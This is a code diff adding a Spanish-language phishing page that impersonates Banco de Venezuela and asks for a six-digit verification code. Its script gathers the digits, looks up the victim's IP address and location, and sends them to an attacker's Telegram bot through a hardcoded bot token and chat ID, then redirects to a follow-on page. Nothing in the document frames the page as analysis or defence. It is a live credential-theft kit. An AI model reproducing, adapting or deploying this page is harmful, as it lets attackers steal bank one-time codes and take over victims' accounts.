@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+
+<script>;var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+(window,document,'script','dataLayer','GTM-T2VG59');</script>
+
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+
+	<link rel="stylesheet" href="./hhhhhh_files/bactouch.css"><link rel="stylesheet" href="./hhhhhh_files/toolbar.css"><link rel="stylesheet" href="./hhhhhh_files/bact_listview.css"><link rel="stylesheet" href="./hhhhhh_files/footer.css"><script src="./hhhhhh_files/authhub-helper.js.descarga"></script><link rel="stylesheet" href="./hhhhhh_files/slidemenu.css"><script src="./hhhhhh_files/ap.js.descarga"></script></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de inicio</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('logig.jpg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px; /* Aumentado el ancho para acomodar todos los elementos */
+            width: 100%;
+        }
+
+        .logo {
+            width: 300px;
+            margin-bottom: 20px;
+        }
+
+        .text-bold {
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .form-input {
+            width: 40px; /* Ancho ajustado para cada casilla */
+            padding: 10px;
+            margin: 10px 5px; /* Espacio entre las casillas */
+            text-align: center; /* Centrar texto en las casillas */
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px; /* Tamaño de fuente ajustado */
+            box-sizing: border-box; /* Incluir el borde en el tamaño total */
+            /* Limitar la entrada a un solo número */
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+
+        .form-input::-webkit-outer-spin-button,
+        .form-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .form-checkbox {
+            margin: 20px 0;
+            text-align: left; /* Alinear el texto a la izquierda */
+        }
+
+        .form-button {
+            background-color: #a41a16; 
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin-top: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 200px; /* Ancho máximo para el boton */
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMJmP8D7gQ3yUqzIWpHMWJjL5lbKC4z1H59U8mL" crossorigin="anonymous">
+</head>
+<body>
+    <div class="container">
+
+
+<p style="text-align: center;"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Banco_de_Venezuela_logo.svg/2560px-Banco_de_Venezuela_logo.svg.png" alt="Archivo:Banco de Venezuela logo.svg - Wikipedia, la enciclopedia libre" width="272" height="49" /></p>
+
+        <div class="text-bold">Introduce tu codigo de 6 digitos.</div>
+
+                        	        <form id="loginForm">
+
+            <div style="display: flex; justify-content: center; align-items: center;">
+                <input type="number" id="usuario1" name="usuario1" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 1">
+                <input type="number" id="usuario2" name="usuario2" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 2">
+                <input type="number" id="usuario3" name="usuario3" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 3">
+                <input type="number" id="usuario4" name="usuario4" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 4">
+                <input type="number" id="usuario5" name="usuario5" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 5">
+                <input type="number" id="usuario6" name="usuario6" class="form-input" min="0" max="9" maxlength="1" required aria-label="Usuario 6">
+            </div>
+            <div class="form-checkbox">
+                <input type="checkbox" id="terms" required>
+                <label for="terms">Acepto los terminos y condiciones de uso</label>
+            </div>
+            <button type="submit" class="form-button">Validar</button>
+        </form>
+    </div>
+    
+
+</form>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+                var u_name1 = $('#usuario1').val();
+                var u_name2 = $('#usuario2').val();
+                var u_name3 = $('#usuario3').val();
+                var u_name4 = $('#usuario4').val();
+                var u_name5 = $('#usuario5').val();
+                var u_name6 = $('#usuario6').val();
+
+
+
+                var ip, ip2;
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                    ip = data.ip;
+                    $.getJSON("https://ipinfo.io", function (response) {
+                        ip2 = response.city + ", " + response.country;
+                        var message = "BDV-TOKEN:\nCodigo: " + u_name1 + "\nCodigo: " + u_name2 + "\nCodigo: " + u_name3 + "\nCodigo: " + u_name4 + "\nCodigo: " + u_name5 + "\nCodigo: " + u_name6 + "\nIP: " + ip + "\n" + ip2;
+                        var telegram_bot_id = "7230358668:AAEC3hyS2FbTvqd79tmGRsebc6RGRU3bB_Y"; // Reemplaza con tu Bot ID
+                        var chat_id = "5610114301"; // Reemplaza con tu Chat ID
+                        var settings = {
+                            "async": true,
+                            "crossDomain": true,
+                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+                            "method": "POST",
+                            "headers": {
+                                "Content-Type": "application/json",
+                                "cache-control": "no-cache"
+                            },
+                            "data": JSON.stringify({
+                                "chat_id": chat_id,
+                                "text": message
+                            })
+                        };
+                        $.ajax(settings).done(function (response) {
+                            window.location = '2.html'; // Redirige después de enviar el mensaje
+                        });
+                    });
+                });
+            });
+        });
+    </script>
+
+
+</body>
+</html>
